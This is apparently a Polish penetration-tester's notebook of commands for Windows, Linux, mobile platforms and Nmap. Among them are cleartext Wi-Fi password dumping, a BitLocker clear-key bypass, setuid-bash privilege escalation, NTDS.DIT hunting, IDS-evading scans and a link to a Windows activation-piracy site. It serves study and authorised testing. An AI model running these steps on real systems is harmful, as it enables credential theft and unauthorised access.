# Spis treści

- [Cyber Kill Chain](#cyber-kill-chain)
- [Systemy operacyjne](#systemy-operacyjne)
  - [Windows](#windows)
  - [Linux](#linux)
  - [Android](#android)
  - [iOS](#ios)
  - [Chmura](#chmura)
- [Skanowanie podatności](#skanowanie-podatności)
  - [Nmap](#nmap)
  - [Smap](#smap)
  - [RustScan](#rustscan)
  - [Burp Suite](#burp-suite)
  - [Zed Attack Proxy (ZAP)](#zed-attack-proxy-zap)
  - [SQLmap](#sqlmap)
  - [Dirb i Gobuster](#dirb-i-gobuster)
  - [Kube-hunter](#kube-hunter)
  - [ScoutSuite](#scoutsuite)
- [Eksploitacja i dostarczanie payloadów](#eksploitacja-i-dostarczanie-payloadów)
  - [Metasploit](#metasploit)
  - [Empire](#empire)
  - [BLACKEYE](#blackeye)
  - [SET (Social-Engineer Toolkit)](#set-social-engineer-toolkit)
  - [BeEF](#beef)
- [Post-eksploitacja i eskalacja uprawnień](#post-eksploitacja-i-eskalacja-uprawnień)
  - [Mimikatz](#mimikatz)
  - [LinPEAS i WinPEAS](#linpeas-i-winpeas)
  - [GTFOBins i LOLBAS](#gtfobins-i-lolbas)
  - [Iodine](#iodine)
- [Command & Control](#command--control)
- [OSINT (biały wywiad)](#osint-biały-wywiad)
  - [OSINT Framework](#osint-framework)
  - [Maltego](#maltego)
  - [SpiderFoot](#spiderfoot)
  - [Shodan](#shodan)
  - [theHarvester](#theharvester)
  - [Recon-ng](#recon-ng)
  - [FOCA (Fingerprinting Organizations with Collected Archives)](#foca-fingerprinting-organizations-with-collected-archives)
  - [Cyotek WebCopy](#cyotek-webcopy)
- [Bezpieczeństwo Wi-Fi](#bezpieczeństwo-wi-fi)
  - [Aircrack-ng](#aircrack-ng)
  - [wifite](#wifite)
  - [Kismet](#kismet)
  - [Deauther](#deauther)
- [Bezpieczeństwo Active Directory](#bezpieczeństwo-active-directory)
- [Bezpieczeństwo konteneryzacji (Docker)](#bezpieczeństwo-konteneryzacji-docker)
  - [Trivy](#trivy)
- [Oprogramowanie antywirusowe](#oprogramowanie-antywirusowe)
- [Ataki DDoS](#ataki-ddos)
- [Systemy IDS/IPS](#systemy-idsips)
  - [Snort](#snort)
  - [ModSecurity](#modsecurity)
  - [Wazuh](#wazuh)
- [Reverse engineering i analiza malware](#reverse-engineering-i-analiza-malware)
  - [Cheat Engine](#cheat-engine)
  - [Ghidra](#ghidra)
  - [x64dbg](#x64dbg)
  - [HxD](#hxd)
  - [Cutter](#cutter)
  - [ReClass.NET](#reclassnet)
  - [API Monitor](#api-monitor)
  - [Crackmes](#crackmes)
  - [IDA Pro](#ida-pro)
  - [Radare2](#radare2)
  - [Binary Ninja](#binary-ninja)
  - [PEStudio](#pestudio)
  - [YARA](#yara)
  - [Cuckoo Sandbox](#cuckoo-sandbox)
  - [ANY.RUN](#anyrun)
  - [Hybrid Analysis](#hybrid-analysis)
  - [VirusTotal](#virustotal)
- [Informatyka śledcza i reagowanie na incydenty](#informatyka-śledcza-i-reagowanie-na-incydenty)
  - [Autopsy](#autopsy)
  - [Volatility](#volatility)
  - [Sleuth Kit](#sleuth-kit)
  - [FTK Imager](#ftk-imager)
- [Łamanie haseł i hashowanie](#łamanie-haseł-i-hashowanie)
  - [John the Ripper](#john-the-ripper)
  - [Hashcat](#hashcat)
  - [Hydra](#hydra)
- [Phishing](#phishing)
- [Bezpieczeństwo sieci i analiza ruchu](#bezpieczeństwo-sieci-i-analiza-ruchu)
  - [Wireshark](#wireshark)
  - [Tshark](#tshark)
  - [ngrep](#ngrep)
  - [fragroute](#fragroute)
  - [ProxyChains](#proxychains)
  - [SSLStrip](#sslstrip)
  - [iperf](#iperf)
  - [ike-scan](#ike-scan)
  - [ThreatCheck](#threatcheck)
  - [tcpreplay](#tcpreplay)
  - [NetworkMiner](#networkminer)
  - [Netcat](#netcat)
  - [Snorby](#snorby)
  - [tcpxtract](#tcpxtract)
  - [hping3](#hping3)
  - [tcpdump](#tcpdump)
  - [Ettercap](#ettercap)
  - [Bettercap](#bettercap)
  - [Scapy](#scapy)
- [Narzędzia developerskie i produktywność](#narzędzia-developerskie-i-produktywność)
  - [Visual Studio Code](#visual-studio-code)
  - [Tmux](#tmux)
  - [Arduino IDE](#arduino-ide)
  - [DB Browser (SQLite)](#db-browser-sqlite)
  - [draw.io](#drawio)
  - [MobaXterm](#mobaxterm)
  - [WinMerge](#winmerge)
  - [7-Zip](#7-zip)
- [Narzędzia sprzętowe](#narzędzia-sprzętowe)
- [Źródła wiedzy i newsy](#źródła-wiedzy-i-newsy)
- [Przykładowe testy penetracyjne](#przykładowe-testy-penetracyjne)
- [TODO: do nauki / przeczytania](#todo-do-nauki--przeczytania)

# Cyber Kill Chain

Fazy ataku:
1. Reconnaissance (rozpoznanie)
2. Weaponization (przygotowanie narzędzia)
3. Delivery (dostarczenie)
4. Exploitation (eksploitacja)
5. Installation (instalacja)
6. Command & Control (sterowanie)
7. Actions on Objective (działania na celu)

# Systemy operacyjne

## Windows

Aktywacja Windows i Office — https://massgrave.dev/

Zawsze otwieraj wiersz poleceń w trybie administratora:
```bash
runas /user:Administrator cmd
powershell -Command "Start-Process cmd -Verb RunAs"
```
Ukrycie pliku zip lub rar wewnątrz obrazu:
```bash
copy /b image.extension+folder.zip image.extension
```
Szyfrowanie plików w folderze:
```bash
cipher /E
```
Ukrycie/odkrycie folderu przed wszystkimi:
```bash
attrib +h +s +r foldername
attrib -h -s -r foldername
```
Wyświetlenie wszystkich haseł Wi-Fi:
```bash
netsh wlan show profile
netsh wlan show profile wifinetwork key=clear | findstr "Key Content"
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") & echo.
```
Stworzenie pliku batch:
```bash
for /F "tokens=2 delims=:" %a in ('netsh wlan show profile') do @(set wifi_pwd= & for /F "tokens=2 delims=: usebackq" %F IN (`netsh wlan show profile %a key^=clear ^| find "Key Content"`) do @(set wifi_pwd=%F) & echo %a : !wifi_pwd!)
```
Wyświetlenie szczegółowych informacji o systemie i konfiguracji:
```bash
systeminfo
```
Pobranie adresów MAC wszystkich urządzeń:
```bash
getmac -v
```
Bezpieczne kopiowanie plików między zdalnymi hostami:
```bash
scp file.txt root@serverip:~/file.txt
```
Otwarcie CMD w danym katalogu Windows:
```bash
wpisz „CMD" w pasku adresu Eksploratora
```
Otwarcie Eksploratora z wiersza poleceń:
```bash
explorer.
```
Zamapowanie zwykłego folderu jako zamontowanego dysku:
```bash
subst q: c://filelocation
```
Usunięcie zamontowanego dysku:
```bash
subst /d q:
```
Zmiana koloru tła i tekstu w wierszu poleceń:
```bash
color 07 [tlo:tekst]
```
Zmiana tekstu zachęty (prompt):
```bash
prompt {tekst}$G
```
Reset tekstu zachęty:
```bash
prompt
```
Zmiana tytułu okna wiersza poleceń:
```bash
title {tekst}
```
Usuwanie plików tymczasowych w celu zwolnienia miejsca:
```bash
del /q /f /s %temp%\*
del /s /q C:\Windows\temp\*
```
Historia komend:
```bash
doskey /history
```
Użycie Windows Terminal zamiast wiersza poleceń:
1. Pobierz i zainstaluj Windows Terminal ze sklepu Microsoft Store lub z GitHuba.
2. Uruchom Windows Terminal.
3. Kliknij strzałkę w dół u góry okna (obok plusa) i wybierz „Settings".
4. W ustawieniach znajdź „defaultProfile" i ustaw jego wartość na GUID wybranego profilu (np. PowerShell, Command Prompt lub WSL).
5. Zapisz ustawienia i zamknij okno.
6. Aby otworzyć nową kartę, naciśnij „Ctrl+Shift+T" lub kliknij plus na pasku kart i wybierz profil.
7. W Windows Terminal możesz przeciągnąć i upuścić plik do terminala, gdy potrzebujesz jego ścieżki.

Szukanie plików i katalogów o danej nazwie:
```bash
Get-ChildItem -Path C:\ -Recurse -Filter "NTDS.DIT" -ErrorAction SilentlyContinue
```
Wyświetlenie tablicy routingu — znane sieci danego komputera:
```bash
route print
```
Dodanie wpisu do tablicy routingu (do jakiej sieci, z jaką maską i nasz adres IP):
```bash
route add 192.168.10.0 MASK 255.255.255.0 192.168.0.15
```
Usuwanie z tablicy routingu:
```bash
route DELETE xxx.xxx.xxx.xxx
```
Zwolnienie aktualnego adresu IP przypisanego przez serwer DHCP, a następnie zażądanie nowego:
```bash
ipconfig /release
ipconfig /renew
```
Lokalizacja pliku hosts:
```bash
C:\Windows\System32\drivers\etc
```
Wyświetlenie zapisanych wpisów DNS i wyczyszczenie tej listy:
```bash
ipconfig /displaydns
ipconfig /flushdns
```
Wyświetlenie aktywnych połączeń sieciowych, nasłuchujących portów i powiązanych identyfikatorów procesów (PID):
```bash
netstat -ano
```
Lokalizacja haseł lokalnych użytkowników i sposób ich odczytania:
```bash
%SystemRoot%\System32\config\SAM
https://www.youtube.com/watch?v=L26Xq7m0uQ0
"Password Cracking of Windows Operating System.pdf"
```
Przydatne dodatki (pliki do pobrania standalone):
* `procexp.exe` — Eksplorator procesów (Process Explorer)
* https://www.nirsoft.net/ — kolekcja małych, przydatnych darmowych narzędzi (FullEventLogView / WinPrefetchView)
* https://www.shadowexplorer.com/ — przeglądanie kopii w tle (Shadow Copies) tworzonych przez Windows
* https://ericzimmerman.github.io/#!index.md — kolejny zbiór małych, przydatnych darmowych narzędzi (AmcacheParser / RECmd / ShellBags Explorer / AppCompatCacheParser)
* `MediaCreationTool22H2.exe`

Stworzenie katalogów o podanej nazwie daje odpowiedni skrót:
```bash
GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}
MyComputer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
WinVault.{1206F5F1-0569-412C-8FEC-3204630DFB70}
Firewall.{4026492F-2F69-46B8-B9BF-5654FC07E423}
Network.{208D2C60-3AEA-1069-A2D7-08002B30309D}
NetworkedProgrammInstall.{15eae92e-f17a-4431-9f28-805e482dafd4}
Wireless.{1FA9085F-25A2-489B-85D4-86326EEDCD87}
RDPConnections.{241D7C96-F8BF-4F85-B01F-E2B043341A4B}
Printers.{2227A280-3AEA-1069-A2DE-08002B30309D}
```
Aby wejść do BIOS, wystarczy zrobić restart z przytrzymanym przyciskiem Shift.

Otwarcie menedżera zapisanych nazw użytkowników i haseł:
```bash
rundll32.exe keymgr.dll, KRShowKeyMgr
```
Sprawdzenie, czy dysk jest zaszyfrowany BitLockerem:
```bash
manage-bde -status
```
Obejście BitLockera:
```bash
# Podczas aktualizacji systemu BitLocker uruchamia poniższą komendę na czas update/restartu,
# co sprawia, że udostępnia klucz szyfrujący w postaci jawnego tekstu:
Suspend-BitLocker -MountPoint "C:" -RebootCount 1   # (0 = zawiesza ochronę bezterminowo, aż do ręcznego wznowienia)

# BitLocker szyfruje dysk kluczami nazwanymi przez Microsoft po swojemu:
# FVEK <--- VMK <--- KP
# Taki dysk można podłączyć pod maszynę z Linuksem i sprawdzić stan BitLockera:
bdeinfo /dev/xvdb2
# Wtedy można zobaczyć Key protector 2 jako typ Clear Key — czyli zapisany jawnym tekstem.
# Można ten dysk zamontować:
bdemount /dev/xvdb2 /mnt/fuser/
mount -o loop,ro /mnt/fuser/bde1 /mnt/bitunlocker/
ls -alF /mnt/bitunlocker/
# W tym trybie można odczytać nawet główny klucz szyfrujący FVEK — mając go, nie potrzeba hasła do odszyfrowania dysku:
dislocker -vvvv -V /dev/xvdb2
```
Do wykonywania kluczowych operacji Windows wykorzystuje bibliotekę NTDLL (`ntdll.dll`). Zawiera ona zbiór funkcji i wywołań systemowych (natywne API Windowsa) niezbędnych do prawidłowego funkcjonowania procesów i aplikacji. Działa jako interfejs między oprogramowaniem a komponentami sprzętowymi komputera. Przykład — NTDLL unhooking:
```bash
NtOpenProcess          # otwarcie procesu
NtAllocateVirtualMemory # zaalokowanie obszaru pamięci
NtWriteVirtualMemory    # zapisanie do pamięci
NtCreateThreadEx        # wykonanie wątku w zdalnym procesie
```
Eskalacja uprawnień w Windows:
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Pozostałe materiały:
* https://kapitanhack.pl/2023/06/30/nieskategoryzowane/co-nowego-w-microsoft-sysmon-v15-ciekawostki-dla-threat-hunterow/
* https://learn.microsoft.com/en-us/windows/privacy/diagnostic-data-viewer-overview
* https://learn.microsoft.com/pl-pl/sysinternals/downloads/sysmon
* Microsoft PowerToys

## Linux

Pomocne: https://explainshell.com/

Wysyła żądania ICMP echo do 192.168.0.1, by sprawdzić łączność i zmierzyć czas odpowiedzi. W etycznym hakowaniu używane na etapie rozpoznania do weryfikacji, czy host jest osiągalny.
```bash
ping 192.168.0.1
```
Wysyła żądania ICMP echo o rozmiarze pakietu 1300 bajtów do 172.18.0.11. Przydatne do testowania, jak sieć lub host radzi sobie z większymi pakietami — pomaga wykryć błędne konfiguracje lub podatności związane z fragmentacją.
```bash
ping -s 1300 172.18.0.11
```
Wysyła flood pingów z dużymi pakietami (1300 bajtów) do 172.18.0.11. Opcja `-f` wysyła pakiety tak szybko, jak to możliwe — można tak testować odporność na DoS.
```bash
ping -s 1300 -f 172.18.0.11
```
Wyświetla na bieżąco wykorzystanie pasma na interfejsach sieciowych. Przydatne do monitorowania ruchu pod kątem anomalii lub oceny wpływu testów na pasmo.
```bash
iftop
```
Zestawia tunel hermetyzowany w żądaniach i odpowiedziach ICMP echo. Może służyć do obejścia ograniczeń sieciowych lub do ukrytej komunikacji podczas testów penetracyjnych.
```bash
ptunnel
```
Przeszukuje rekurencyjnie (`r`), ignorując wielkość liter (`i`), wszystkie pliki od bieżącego katalogu w poszukiwaniu ciągu „tree", pokazując numery linii (`n`) i nazwy plików (`H`). Wynik trafia do `vim` do edycji.
```bash
grep -Hnri 'tree' | vim -
```
Komenda używana wewnątrz `vim` do posortowania linii otwartego pliku. Przydatna do porządkowania danych (np. adresów IP lub URL) na etapie analizy.
```bash
:%!sort
```
Komenda `vim` filtrująca linie zawierające `.git` z otwartego pliku (`grep -v` odwraca dopasowanie). Pomaga wykluczyć katalogi kontroli wersji z wyników wyszukiwania.
```bash
:%!grep -v .git
```
Skanuje 10.77.14.0/24 w poszukiwaniu otwartych portów 80, 443 i 22 z prędkością 1000 pakietów/s. Masscan służy do bardzo szybkich skanów dużych sieci.
```bash
masscan -p80,443,22 10.77.14.0/24 --rate=1000
```
Skanuje cały zakres 10.0.0.0/8 na wszystkich portach z wysoką prędkością — pokaz możliwości Masscana w szybkim skanowaniu na dużą skalę.
```bash
masscan 10.0.0.0/8 -p0-65535 --rate=10000
```
Skanuje porty 80 i 443 w zakresie 10.0.0.0/8 z randomizacją kolejności hostów.
```bash
masscan -p80,443 10.0.0.0/8 --rate=1000 --randomize-hosts
```
Skanuje port 23 (Telnet) w całym zakresie 10.0.0.0/8 z wysoką prędkością. Służy do szybkiego wykrywania potencjalnie podatnych usług Telnet.
```bash
masscan -p23 10.0.0.0/8 --rate=10000
```
Żartobliwa komenda pokazująca animację lokomotywy przejeżdżającej przez terminal. Niezwiązana z hakowaniem — to humorystyczne przypomnienie, by nie pomylić `ls` z czymś innym.
```bash
sl
```
Ustawia alias `ls` na `cat /dev/urandom`, przez co wpisanie `ls` wyświetla losowe dane. To raczej żart — nadpisuje zachowanie powszechnie używanej komendy, więc używaj ostrożnie.
```bash
alias ls="cat /dev/urandom"
```
Pobiera informacje WHOIS dla microsoft.com (rejestracja, własność, kontakty administracyjne). Używane na etapie rozpoznania do zbierania informacji o właścicielu domeny.
```bash
whois microsoft.com
host microsoft.com
dig a +short microsoft.com
dig mx microsoft.com
```
Identyfikuje technologie używane na stronie networkchuck.coffee (serwer WWW, CMS, biblioteki JavaScript itd.). Przydatne do planowania ataku przez wskazanie potencjalnych podatności oprogramowania.
```bash
whatweb networkchuck.coffee
```
Wysyła żądanie HTTP GET, wyświetlając pełne nagłówki odpowiedzi HTTP (opcja `-i`). Przydatne w rozpoznaniu webowym do zebrania informacji o serwerze (wersje oprogramowania, cookies).
```bash
curl -i https://networkchuck.hackwithnahamsec.com
```
Wysyła żądanie HTTP GET z własnym nagłówkiem `X-API-TOKEN` do uwierzytelnienia. Często używane przy testach API, by sprawdzić, czy chronione endpointy są dostępne tylko z poprawnym tokenem.
```bash
curl -i https://networkchuck.hackwithnahamsec.com -H 'X-API-TOKEN: <api token>'
```
Przeprowadza kompleksowe skanowanie serwera WWW networkchuck.coffee w poszukiwaniu niebezpiecznych plików, przestarzałego oprogramowania i innych podatności. Nikto służy do testów bezpieczeństwa aplikacji webowych.
```bash
nikto networkchuck.coffee
```
Brute-force katalogów i plików na https://networkchuck.com z użyciem podanej wordlisty. Gobuster pomaga znaleźć ukryte zasoby, które nie miały być publicznie dostępne.
```bash
gobuster dir -u https://networkchuck.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
Instaluje pakiet seclists — zbiór gotowych wordlist do różnych testów bezpieczeństwa (hasła, payloady do fuzzingu, enumeracja katalogów).
```bash
apt install seclists
```
Pobiera konkretną wordlistę do enumeracji DNS z repozytorium SecLists. Służy do odkrywania subdomen i innego rozpoznania DNS.
```bash
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/DNS/dns-Jhaddix.txt
```
Przeprowadza enumerację subdomen networkchuck.com z użyciem wordlisty `dns-Jhaddix.txt`. Metoda odkrywania subdomen, które mogą ujawnić dodatkowe powierzchnie ataku.
```bash
gobuster dns -d networkchuck.com -w dns-jhaddix.txt
```
Narzędzie do szybkiej enumeracji subdomen, zbierające dane z wyszukiwarek, stron i serwerów DNS. Pomaga odkryć dodatkowe domeny powiązane z celem.
```bash
sublist3r
```
Skanuje stronę WordPress chuckkeith.com pod kątem enumeracji użytkowników. Te informacje mogą posłużyć do ataków brute-force lub kampanii phishingowych.
```bash
wpscan --url chuckkeith.com --enumerate u
```
Enumeruje zainstalowane wtyczki na chuckkeith.com. Kluczowe do identyfikacji potencjalnie podatnych wtyczek.
```bash
wpscan --url chuckkeith.com --enumerate p
```
Agresywnie enumeruje podatne wtyczki (`vp`) i motywy (`vt`) na example.com. Tryb agresywny zwiększa szansę na wykrycie ukrytych lub mniej oczywistych komponentów.
```bash
wpscan --url http://example.com --enumerate vp,vt --plugins-detection aggressive
```
Pasywna enumeracja domeny example.com narzędziem Amass — bez bezpośredniej interakcji z serwerami celu, co zmniejsza ryzyko wykrycia. Przydatne do mapowania zewnętrznej powierzchni ataku.
```bash
amass enum -passive -d example.com
```
Git — system kontroli wersji używany m.in. do klonowania repozytoriów (baz exploitów, narzędzi). Np. sklonowanie repozytorium exploitów daje gotowe zasoby do testów.
```bash
git
```
Narzędzie wiersza poleceń do przeszukiwania Exploit Database. Pozwala znaleźć znane podatności i exploity dla wykrytego oprogramowania. Przykłady: `searchsploit wordpress plugins`, `searchsploit ssh`.
```bash
searchsploit
```
Uruchamia nową powłokę Bash z opcją `-p`, która zachowuje efektywne UID i GID. Wykorzystywane przy eskalacji uprawnień, gdy zostanie nadużyty skrypt/program z bitem setuid.
```bash
/bin/bash -p
```
Ustawia bit setuid (`+s`) na `/bin/bash`, przez co działa on z uprawnieniami właściciela pliku (zwykle root) dla każdego, kto go uruchomi. Klasyczny przykład techniki eskalacji uprawnień.
```bash
sudo chmod +s /bin/bash
```
Wyświetla pamięć podręczną ARP jądra:
```bash
arp -a
```
Usuwa wszystkie wpisy ARP dla wszystkich hostów:
```bash
arp -d *
```
Nawiązuje połączenie SSH z 192.168.1.1 jako użytkownik networkchuck. SSH służy do bezpiecznej, szyfrowanej komunikacji z celami podczas testów.
```bash
ssh networkchuck@192.168.1.1
```
Wykonuje konkretną komendę na zdalnym hoście przez SSH. Pozwala zdalnie uruchamiać polecenia na celu (eksploitacja lub post-eksploitacja).
```bash
ssh user@remote_host 'command_to_run'
```
Zestawia połączenie SSH z 172.234.88.97 jako root, tworząc dynamiczne proxy SOCKS na lokalnym porcie 1337 (`-D 1337`), z kompresją (`-C`), w trybie cichym (`-q`), bez wykonywania zdalnej komendy (`-N`). Przydatne do anonimowego przeglądania przez cel lub omijania ograniczeń sieciowych.
```bash
ssh -D 1337 -C -q -N root@172.234.88.97
```
Daje 100% pewności, że dane z dysku/pendrive itd. zostaną zrzucone — po tym można bezpiecznie np. wyjąć pendrive:
```bash
sync
```
Możliwość podniesienia uprawnień przez modyfikację pliku:
```bash
sudo nano /etc/group
```
ID procesu:
```bash
pgrep passwd
```
Reset powłoki:
```bash
reset
```
Zadania w tle:
```bash
jobs
```
Jakie urządzenia były podłączone do maszyny:
```bash
grep SerialNumber /var/log/syslog
```
Operacje na pliku passwd:
```bash
grep bash passwd | wc -l
cut -d : -f 1 passwd
cut -d : -f 3 passwd | sort -n
tail -n 3 passwd
cut -d : -f 3 passwd | sort -n | tail -n 3
wc -l passwd
```
Wyświetlenie wszystkich zmiennych środowiskowych:
```bash
echo $ <tab> <tab>
```
Informacja o danym pliku wykonywalnym:
```bash
type -a pwd
```
Modyfikacja konfiguracji sieciowej:
```bash
nano /etc/network/interfaces
systemctl restart network.service
nano /etc/resolv.conf
```
Jakie komendy mogę wykonywać jako root:
```bash
sudo -l
```

## Android

Materiały:
* APKLeaks
* https://developer.android.com/guide/topics/manifest/manifest-intro?hl=pl
* https://sekurak.pl/drozer-narzedzie-do-analizy-aplikacji-mobilnych-android/
* https://sekurak.pl/rootowanie-androida-od-wersji-1-0-wszystko-dzieki-dirty-cow-do-pobrania-poc/

### Co dzieje się po uruchomieniu systemu (bootowanie)

1. **BootROM** — oprogramowanie read-only, zahardkodowane w chipie, stanowiące początek root-of-trust. (Teoretycznie) niemodyfikowalne.
2. **Bootloader** — oprogramowanie wgrywane przez producenta urządzenia, nienależące do systemu Android. Do jego głównych funkcji należy m.in. wskazanie lokalizacji uruchamianego systemu operacyjnego, wczytanie jądra Linux oraz uruchomienie tzw. Trusted Execution Environment (TEE; inna nazwa — Trusty). Dokumentacja Trusty: https://source.android.com/security/trusty?hl=en. Odblokowanie bootloadera = wyłączenie weryfikacji podpisu wczytywanego oprogramowania — jeden z kluczowych kroków do (prostego) zrootowania urządzenia.
3. **Kernel** — program stanowiący główną warstwę między systemem operacyjnym a fizycznymi komponentami smartfonu. Zarządza podstawowymi zasobami i funkcjonalnościami systemu — procesami, pamięcią, systemami plików, kontrolą uprawnień itd. Android bazuje na jądrze Linux.
4. **Init** — pierwszy kluczowy proces systemu. Definiuje podstawowe czynności wykonywane podczas inicjalizacji oraz podstawowe katalogi. Wczytuje pliki konfiguracyjne zewnętrznych usług systemowych (np. bluetooth, karta sieciowa).
   * https://android.googlesource.com/platform/system/core/+/master/init/README.md
   * https://community.nxp.com/t5/i-MX-Processors-Knowledge-Base/What-is-inside-the-init-rc-and-what-is-it-used-for/ta-p/1106360
5. **Zygota** — zarządza uruchamianiem aplikacji w modelu klient-serwer. Każda aplikacja uruchomiona na urządzeniu jest rozwidleniem (`fork`) podstawowego procesu Zygoty. Nowe aplikacje uruchamiane są przez odwołanie do gniazda `/dev/socket/zygote`.
6. **System** — podstawowe usługi systemowe wczytywane są przez proces `SystemServer`. Następnie wczytywane jest UI i pozostałe elementy systemu.

Polecenia diagnostyczne:
```bash
adb logcat                      # logi urządzenia
adb logcat | grep SystemServer  # logi SystemServer
```

### Główne mechanizmy bezpieczeństwa

**SELinux** — ścisłe zdefiniowanie uprawnień danego procesu i wyłączenie dostępu do nadmiarowych funkcjonalności. Uprawnienia zdefiniowane z wykorzystaniem polityk Mandatory Access Control (MAC). Polityki znajdują się w folderze `/system/etc/selinux/`.
```bash
adb logcat | grep "avc:"   # podglądanie reguł SELinux
```
* https://source.android.com/docs/security/features/selinux/validate?hl=pl

**Sandbox** — każda zainstalowana aplikacja działa jako oddzielny użytkownik w systemie. Domyślny dostęp wyłącznie do katalogu „domowego" + podstawowych usług systemowych.

**Szyfrowanie danych:**
* Dawniej: **FDE (Full Disk Encryption)** — Android 5.0–9.0. Szyfrowanie bazujące na jednym kluczu do wszystkiego. Stąd problem z działaniem usług przed pierwszym odblokowaniem telefonu po ponownym uruchomieniu.
* Aktualnie: **FBE (File Based Encryption)** — Android 10.0+. Każdy plik szyfrowany osobnym kluczem. Wprowadzono dwa rodzaje pamięci:
  * **Device Encrypted Storage** — dane dostępne przed pierwszym odblokowaniem po restarcie (szyfrowane kluczami bazującymi na unikalnym ID telefonu — UID).
  * **Credential Encrypted Storage** — dane dostępne po pierwszym odblokowaniu telefonu (szyfrowane kluczami bazującymi na UID + PIN odblokowania).
* https://developer.android.com/training/articles/direct-boot

**Root (Android):** wymaga odblokowania bootloadera. Najpopularniejsze rozwiązanie — **Magisk** (https://github.com/topjohnwu/Magisk). Polega na modyfikacji obrazu systemu wczytywanego podczas uruchamiania urządzenia (`boot.img`).

## iOS

### Co dzieje się po uruchomieniu systemu (bootowanie)

1. **BootROM** — oprogramowanie read-only, zahardkodowane w chipie, stanowiące początek root-of-trust. (Teoretycznie) niemodyfikowalne.
2. **LLB** — w starszych procesorach krok przejściowy przed uruchomieniem iBoot (bootloadera). Wykonuje operacje rozruchowe i sprawdza podpis kolejnego procesu.
3. **iBoot** — tzw. second-stage bootloader. Służy do wczytania systemu operacyjnego. Z tego poziomu można wejść do trybu Recovery.
4. **Kernel** — wczytanie systemu operacyjnego iOS (BSD, UNIX-like).
5. Wczytanie pozostałych komponentów iOS.

### Główne mechanizmy bezpieczeństwa

**Secure Enclave** — dodatkowy, równoległy koprocesor, izolowany od pozostałych komponentów i zwyczajnego procesora. Stworzony do bezpiecznego przechowywania wrażliwych danych o urządzeniu, nawet gdy procesor aplikacji zostanie skompromitowany. Obsługiwany przez dedykowany niskopoziomowy system `sepOS`.

**Sandbox** — każda aplikacja ma swój oddzielny kontener, izolowany od pozostałych. W odróżnieniu od Androida wszystkie aplikacje instalowane są przez użytkownika `installd` oraz uruchamiane przez użytkownika `mobile`.

**Data Protection Classes** — programista może zdefiniować poziom szyfrowania plików aplikacji.

Aby zjailbreakować smartfon z iOS (uzyskać uprawnienia root), konieczne jest wykorzystanie jednego z exploitów na eskalację uprawnień. Działające programy do jailbreakowania: Checkra1n (https://checkra.in/) oraz Unc0ver (https://unc0ver.dev/) — iOS do 15. W wersji 15+ aktualnie działa poprawnie Palera1n (https://github.com/palera1n/palera1n).

Jedna z firm skupujących błędy typu 0-day do tworzenia zaawansowanego oprogramowania szpiegowskiego — Zerodium: https://zerodium.com/program.html

Comiesięczny biuletyn bezpieczeństwa Android: https://source.android.com/docs/security/bulletin/

## Chmura

* https://github.com/RhinoSecurityLabs/cloudgoat
* https://rzepsky.medium.com/

# Skanowanie podatności

## Nmap

Skan typu „ping" na podsieci 192.168.1.0/24 — identyfikuje żywe hosty bez skanowania portów. Podstawowe narzędzie rozpoznania do mapowania struktury sieci.
```bash
nmap -sn 192.168.1.0/24
```
Skanuje 192.168.1.1 w celu identyfikacji wersji usług na otwartych portach. Kluczowe do wykrycia podatnych wersji oprogramowania.
```bash
nmap -sV 192.168.1.1
```
Próbuje zidentyfikować system operacyjny 192.168.1.1 na podstawie zachowań sieciowych. Pomaga dostosować dalsze ataki do podatności konkretnego OS.
```bash
nmap -O 192.168.1.1
```
Skanuje 192.168.1.1 bez wstępnego pingu — przydatne, gdy cel może blokować żądania ICMP echo. Skan bardziej dyskretny.
```bash
nmap -Pn 192.168.1.1
```
Listuje każdy adres IP w podsieci 192.168.1.0/24 bez wysyłania do nich pakietów. Używane do planowania lub dokumentacji, zwłaszcza w dużych sieciach.
```bash
nmap -sL 192.168.1.0/24
```
Uruchamia skrypty wykrywania podatności Nmap przeciwko 192.168.1.1. Pomaga zidentyfikować znane podatności.
```bash
nmap --script vuln 192.168.1.1
```
Skanuje 192.168.1.1 skryptami wykrywającymi infekcje malware. Szybki sposób na sprawdzenie, czy host jest skompromitowany.
```bash
nmap --script malware 192.168.1.1
```
Skan agresywny 192.168.1.1 — obejmuje wykrywanie OS i wersji, skanowanie skryptami oraz traceroute. Kompleksowe zbieranie szczegółowych informacji o celu.
```bash
nmap -A 192.168.1.1
```
Skanuje 192.168.1.0/24 z fragmentacją pakietów, co może pomóc ominąć część systemów IDS/IPS. Skan bardziej dyskretny.
```bash
nmap -f 192.168.1.0/24
```
Skanuje 192.168.1.0/24 z portu źródłowego 53, imitując ruch DNS. Może ominąć reguły firewalla zezwalające na ruch DNS.
```bash
nmap --source-port 53 192.168.1.0/24
```
Skanuje 192.168.1.0/24 z użyciem ruchu-wabika z losowych IP (`RND:10`), utrudniając ustalenie prawdziwego źródła skanu.
```bash
nmap -D RND:10 192.168.1.0/24
```

### Metodyka rozpoznania

Wykrycie usług, identyfikacja typu usługi, wersji, oprogramowania, ukrytych plików:
* przy ograniczonej liczbie usług — `nmap`
* gdy sieć jest rozległa — `masscan` + `nmap`

1. Zbierz informacje o aktywnych hostach. Wynik zaimportuj do Metasploit — `nmap -sn`
2. Znajdź otwarte porty. Wynik zaimportuj do Metasploit — `masscan -Pn --rate=2000`
3. Zgromadź informacje o usługach i systemie (banery) — `nmap -sV -O` / `db_nmap -sV -O`
4. Sprawdź manualnie, jakie to usługi — `nc`, `burp`, `curl`, `telnet`
5. Odkryj interesujące ścieżki w serwerach webowych — `ffuf`, `feroxbuster`
6. RECON — podatne usługi? Pliki z nadmiarowymi informacjami? Usługi źle skonfigurowane?
   1. Zlokalizuj w lokalnej sieci LAB usługę na porcie 5000–7000 (TCP).
   2. Podłącz się do niej i ustal, co to za usługa. Spróbuj pobrać istotne informacje.
   3. Poszukaj informacji o podatnościach (cvedetails, `"<usługa> intitle:poc site:github.com"` itd.).
   4. Wykonaj RCE.

* https://sekurak.pl/nmap-w-akcji-przykladowy-test-bezpieczenstwa/

### Komponenty i parametry

Nmap to skaner portów; potrafi też robić OS/service fingerprinting i działać jako podstawowy skaner podatności (skrypty NSE).
* `zenmap` — GUI dla Nmap
